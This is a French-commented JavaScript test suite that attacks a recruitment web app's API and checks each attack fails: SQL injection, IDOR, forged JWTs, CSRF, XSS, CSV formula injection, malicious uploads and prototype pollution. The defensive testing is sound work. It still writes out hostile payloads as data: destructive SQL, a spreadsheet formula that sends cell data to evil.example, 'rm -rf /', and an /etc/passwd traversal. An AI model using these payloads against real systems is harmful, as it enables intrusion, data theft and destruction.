// Tests d'attaque : chaque test reproduit une attaque web courante et vérifie qu'elle échoue.
import { test, before, after, describe } from "node:test";
import assert from "node:assert/strict";
import request from "supertest";
import jwt from "jsonwebtoken";
import { setup, teardown, registerAgent, X, pdfBuffer } from "./helpers.js";

let app, pool, alice, bob, aliceCand, aliceOffer, aliceRun;
before(async () => {
  ({ app, pool } = await setup());
  alice = await registerAgent(request, app, "alice@genesis.test");
  bob = await registerAgent(request, app, "bob@genesis.test");
  aliceOffer = (await alice.post("/api/offers").set(X).send({ title: "Offre secrète d'Alice" })).body.id;
  const run = await alice.post("/api/analyses").set(X).field("criteria", "{}").attach("files", pdfBuffer("alice"), "alice.pdf");
  aliceRun = run.body.runId;
  aliceCand = run.body.results[0].id;
});
after(teardown);

describe("Injection SQL", () => {
  const payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "1 OR 1=1", "1; DELETE FROM candidates", "\\'; SELECT pg_sleep(5); --",
    "' UNION SELECT password_hash FROM users --", "%' AND 1=CAST((SELECT version()) AS int) --"];
  test("login", async () => {
    for (const p of payloads) {
      const r = await request(app).post("/api/auth/login").set(X).send({ email: `x${p}@a.co`, password: p });
      assert.ok([400, 401].includes(r.status), `${p} → ${r.status}`);
    }
  });
  test("recherche, filtres et tri", async () => {
    for (const p of payloads) {
      const t0 = Date.now();
      const r = await bob.get("/api/candidates").query({ q: p });
      assert.equal(r.status, 200);
      assert.equal(r.body.total, 0, "aucune fuite des candidats d'Alice");
      assert.ok(Date.now() - t0 < 3000, "pas d'injection temporelle (pg_sleep)");
      assert.equal((await bob.get("/api/candidates").query({ sort: p })).status, 400);
      assert.equal((await bob.get("/api/candidates").query({ status: p })).status, 400);
    }
  });
  test("identifiants de ressource", async () => {
    for (const id of ["1 OR 1=1", "1;DROP TABLE users", "-1", "0", "1e3", "99999999999", "../1", "%27"]) {
      const r = await bob.get(`/api/candidates/${encodeURIComponent(id)}`);
      assert.ok([400, 404].includes(r.status), `${id} → ${r.status}`);
    }
  });
  test("les tables sont intactes", async () => {
    const { rows } = await pool.query("SELECT COUNT(*)::int AS n FROM users");
    assert.ok(rows[0].n >= 2);
  });
});

describe("Contrôle d'accès (IDOR) : Bob ne voit ni ne modifie rien d'Alice", () => {
  test("lecture", async () => {
    assert.equal((await bob.get(`/api/candidates/${aliceCand}`)).status, 404);
    assert.equal((await bob.get(`/api/candidates/${aliceCand}/file`)).status, 404);
    assert.equal((await bob.get(`/api/offers/${aliceOffer}`)).status, 404);
    assert.equal((await bob.get(`/api/analyses/${aliceRun}`)).status, 404);
    assert.equal((await bob.get("/api/candidates")).body.total, 0);
    assert.equal((await bob.get("/api/analyses")).body.total, 0);
    assert.equal((await bob.get("/api/offers")).body.length, 0);
    assert.equal((await bob.get("/api/dashboard/summary")).body.totals.analysed, 0);
    assert.equal((await bob.get(`/api/candidates/export.csv`)).text.split("\r\n").length, 1);
    assert.equal((await bob.get(`/api/candidates?runId=${aliceRun}`)).body.total, 0);
  });
  test("écriture et suppression", async () => {
    assert.equal((await bob.patch(`/api/candidates/${aliceCand}`).set(X).send({ status: "Refusé" })).status, 404);
    assert.equal((await bob.delete(`/api/candidates/${aliceCand}`).set(X)).status, 404);
    assert.equal((await bob.put(`/api/offers/${aliceOffer}`).set(X).send({ title: "piraté" })).status, 404);
    assert.equal((await bob.delete(`/api/offers/${aliceOffer}`).set(X)).status, 404);
    assert.equal((await bob.delete(`/api/analyses/${aliceRun}`).set(X)).status, 404);
    assert.equal((await alice.get(`/api/candidates/${aliceCand}`)).body.status, "Présélectionné");
  });
  test("rattachement à une ressource d'autrui", async () => {
    const bobCand = (await bob.post("/api/analyses").set(X).field("criteria", "{}").attach("files", pdfBuffer("bob"), "bob.pdf")).body.results[0].id;
    assert.equal((await bob.patch(`/api/candidates/${bobCand}`).set(X).send({ offerId: aliceOffer })).status, 404);
    assert.equal((await bob.post("/api/analyses").set(X).field("offerId", String(aliceOffer)).attach("files", pdfBuffer(), "x.pdf")).status, 404);
    assert.equal((await bob.post("/api/interviews").set(X).send({ candidateId: aliceCand, startsAt: new Date().toISOString() })).status, 404);
    // Injection de CV dans le lot d'analyse d'Alice
    assert.equal((await bob.post("/api/analyses").set(X).field("runId", String(aliceRun)).attach("files", pdfBuffer("x"), "x.pdf")).status, 404);
    assert.equal((await alice.get(`/api/analyses/${aliceRun}`)).body.fileCount, 1);
  });
});

describe("Authentification & sessions", () => {
  test("routes protégées sans session", async () => {
    for (const path of ["/api/candidates", "/api/offers", "/api/analyses", "/api/dashboard/summary", "/api/users/me", "/api/interviews"]) {
      assert.equal((await request(app).get(path)).status, 401, path);
    }
  });
  test("jeton forgé : mauvaise clé, alg=none, expiré, utilisateur inexistant", async () => {
    const { rows: [u] } = await pool.query("SELECT id, token_version FROM users WHERE email = 'alice@genesis.test'");
    const forged = [
      jwt.sign({ sub: String(u.id), tv: u.token_version }, "mauvaise-cle-mauvaise-cle-mauvaise-cle"),
      jwt.sign({ sub: String(u.id), tv: u.token_version }, null, { algorithm: "none" }),
      jwt.sign({ sub: String(u.id), tv: u.token_version }, process.env.JWT_SECRET, { expiresIn: -10 }),
      jwt.sign({ sub: "999999", tv: 0 }, process.env.JWT_SECRET),
      jwt.sign({ sub: String(u.id), tv: u.token_version + 1 }, process.env.JWT_SECRET),
      jwt.sign({ sub: "1 OR 1=1", tv: 0 }, process.env.JWT_SECRET),
      jwt.sign({ sub: String(u.id), tv: u.token_version }, process.env.JWT_SECRET, { algorithm: "HS512" }),
    ];
    for (const t of forged) {
      assert.equal((await request(app).get("/api/auth/me").set("Cookie", `genesis_session=${t}`)).status, 401);
      assert.equal((await request(app).get("/api/auth/me").set("Authorization", `Bearer ${t}`)).status, 401);
    }
  });
  test("compte désactivé : session refusée immédiatement", async () => {
    const eve = await registerAgent(request, app, "eve@genesis.test");
    await pool.query("UPDATE users SET active = false WHERE email = 'eve@genesis.test'");
    assert.equal((await eve.get("/api/auth/me")).status, 401);
    const r = await request(app).post("/api/auth/login").set(X).send({ email: "eve@genesis.test", password: "MotDePasse123" });
    assert.equal(r.status, 401);
  });
  test("force brute : verrouillage après 5 échecs, même avec le bon mot de passe", async () => {
    await registerAgent(request, app, "victime@genesis.test");
    for (let i = 0; i < 5; i++) {
      const r = await request(app).post("/api/auth/login").set(X).send({ email: "victime@genesis.test", password: "mauvais" + i });
      assert.equal(r.status, 401);
    }
    const r = await request(app).post("/api/auth/login").set(X).send({ email: "victime@genesis.test", password: "MotDePasse123" });
    assert.equal(r.status, 423);
  });
  test("pas d'énumération : même message pour email inconnu et mot de passe faux", async () => {
    const a = await request(app).post("/api/auth/login").set(X).send({ email: "inconnu@genesis.test", password: "xxxxxxxxxx1" });
    const b = await request(app).post("/api/auth/login").set(X).send({ email: "bob@genesis.test", password: "xxxxxxxxxx1" });
    assert.equal(a.status, b.status);
    assert.equal(a.body.error, b.body.error);
  });
  test("le hash du mot de passe n'est jamais renvoyé", async () => {
    for (const path of ["/api/auth/me", "/api/users/me"]) {
      assert.doesNotMatch(JSON.stringify((await alice.get(path)).body), /\$2[aby]\$|password/i);
    }
  });
});

describe("CSRF & CORS", () => {
  test("requête modifiante sans en-tête anti-CSRF refusée même avec cookie valide", async () => {
    const r = await alice.post("/api/offers").send({ title: "csrf" });
    assert.equal(r.status, 403);
    assert.equal((await alice.delete(`/api/offers/${aliceOffer}`)).status, 403);
  });
  test("origine étrangère non autorisée par CORS", async () => {
    const r = await request(app).options("/api/offers").set("Origin", "https://evil.example").set("Access-Control-Request-Method", "POST");
    assert.notEqual(r.headers["access-control-allow-origin"], "https://evil.example");
  });
});

describe("XSS & en-têtes de sécurité", () => {
  test("les contenus sont renvoyés en JSON brut, jamais interprétés", async () => {
    const xss = `<script>alert(document.cookie)</script><img src=x onerror=alert(1)>`;
    const r = await alice.patch(`/api/candidates/${aliceCand}`).set(X).send({ recruiterNotes: xss });
    assert.equal(r.status, 200);
    const d = await alice.get(`/api/candidates/${aliceCand}`);
    assert.match(d.headers["content-type"], /application\/json/);
    assert.equal(d.body.recruiterNotes, xss);
  });
  test("en-têtes durcis", async () => {
    const r = await alice.get("/api/candidates");
    assert.equal(r.headers["x-powered-by"], undefined);
    assert.equal(r.headers["x-content-type-options"], "nosniff");
    assert.match(r.headers["content-security-policy"], /default-src 'none'/);
    assert.ok(r.headers["strict-transport-security"]);
    assert.equal(r.headers["x-frame-options"], "SAMEORIGIN");
  });
  test("injection de formules dans l'export CSV neutralisée", async () => {
    const evil = `=HYPERLINK("http://evil.example/?x="&A1,"Cliquez")`;
    await alice.patch(`/api/candidates/${aliceCand}`).set(X).send({ fullName: evil });
    const csv = (await alice.get("/api/candidates/export.csv")).text;
    assert.ok(!csv.includes(`;"=HYPERLINK`) && !csv.includes(`\n"=HYPERLINK`), "aucune cellule ne commence par =");
    assert.ok(csv.includes(`"'=HYPERLINK(""http://evil.example`), "formule neutralisée par une apostrophe");
    for (const p of ["+cmd", "-2+3", "@SUM(A1)"]) {
      await alice.patch(`/api/candidates/${aliceCand}`).set(X).send({ phone: p });
      assert.ok((await alice.get("/api/candidates/export.csv")).text.includes(`"'${p}"`), p);
    }
  });
});

describe("Fichiers malveillants", () => {
  test("exécutable déguisé, HTML déguisé, extension interdite", async () => {
    const cases = [
      [Buffer.from("MZ\x90\x00\x03\x00\x00\x00 programme"), "cv.pdf"],
      [Buffer.from("<html><script>alert(1)</script></html>"), "cv.pdf"],
      [Buffer.from("#!/bin/sh\nrm -rf /"), "cv.sh"],
      [Buffer.from("PK\x03\x04 pas vraiment un docx mais un zip"), "cv.exe"],
      [Buffer.from("%PDF-1.4 en réalité"), "cv.docx"],
      [Buffer.from("\x00\x01\x02\x03binaire\x00\x00\x00\x00\x00"), "cv.txt"],
    ];
    for (const [buf, name] of cases) {
      const r = await alice.post("/api/analyses").set(X).field("criteria", "{}").attach("files", buf, name);
      assert.equal(r.status, 201);
      assert.match(r.body.results[0].error, /Format non supporté/, name);
    }
  });
  test("traversée de répertoire via le nom de fichier", async () => {
    const r = await alice.post("/api/analyses").set(X).field("criteria", "{}").attach("files", pdfBuffer("trav"), "../../../../Windows/evil.pdf");
    const c = r.body.results[0];
    assert.ok(!c.error);
    const { rows: [row] } = await pool.query("SELECT cv_path FROM candidates WHERE id = $1", [c.id]);
    assert.match(row.cv_path, /^\d+\/cvs\/[0-9a-f-]{36}\.pdf$/);
    assert.ok(!c.filename.includes("/") && !c.filename.includes("\\"));
  });
  test("fichier trop volumineux et trop de fichiers", async () => {
    const big = Buffer.concat([Buffer.from("%PDF-1.4\n"), Buffer.alloc(16 * 1024 * 1024)]);
    assert.equal((await alice.post("/api/analyses").set(X).attach("files", big, "gros.pdf")).status, 413);
    let req = alice.post("/api/analyses").set(X);
    for (let i = 0; i < 26; i++) req = req.attach("files", pdfBuffer(String(i)), `cv${i}.pdf`);
    assert.equal((await req).status, 400);
  });
  test("aucun fichier", async () => {
    assert.equal((await alice.post("/api/analyses").set(X).field("criteria", "{}")).status, 400);
  });
});

describe("Entrées hostiles diverses", () => {
  test("affectation de masse : champs non prévus refusés", async () => {
    assert.equal((await alice.patch(`/api/candidates/${aliceCand}`).set(X).send({ owner_id: 2, score: 100 })).status, 400);
    assert.equal((await alice.patch("/api/users/me").set(X).send({ active: false, token_version: 9 })).status, 400);
    assert.equal((await alice.post("/api/offers").set(X).send({ title: "x", owner_id: 1 })).status, 400);
  });
  test("pollution de prototype", async () => {
    const r = await alice.post("/api/offers").set(X).set("Content-Type", "application/json")
      .send('{"title":"p","__proto__":{"admin":true},"constructor":{"prototype":{"admin":true}}}');
    assert.equal(r.status, 400);
    assert.equal({}.admin, undefined);
  });
  test("pollution de paramètres HTTP", async () => {
    assert.equal((await alice.get("/api/candidates?status=Nouveau&status=Refusé")).status, 400);
    // Opérateur de type NoSQL : traité comme une clé littérale inconnue, jamais interprété.
    const op = await alice.get("/api/candidates?page[$gt]=1&q[$ne]=x");
    assert.equal(op.status, 200);
    assert.equal(op.body.page, 1);
  });
  test("JSON malformé et corps trop gros", async () => {
    assert.equal((await alice.post("/api/offers").set(X).set("Content-Type", "application/json").send("{bad json")).status, 400);
    assert.equal((await alice.post("/api/offers").set(X).send({ title: "x", description: "a".repeat(300 * 1024) })).status, 413);
  });
  test("critères d'analyse JSON invalides ou discriminatoires refusés", async () => {
    assert.equal((await alice.post("/api/analyses").set(X).field("criteria", "{not json").attach("files", pdfBuffer(), "a.pdf")).status, 400);
    assert.equal((await alice.post("/api/analyses").set(X).field("criteria", JSON.stringify({ minAge: 25 })).attach("files", pdfBuffer(), "a.pdf")).status, 400);
  });
  test("route inconnue et erreurs : aucune fuite de pile ou de SQL", async () => {
    const r = await alice.get("/api/../../etc/passwd");
    assert.ok([400, 404].includes(r.status));
    const e = await alice.get("/api/inexistant");
    assert.equal(e.status, 404);
    assert.doesNotMatch(JSON.stringify(e.body), /at |\.js:|SELECT|pg_/);
  });
});
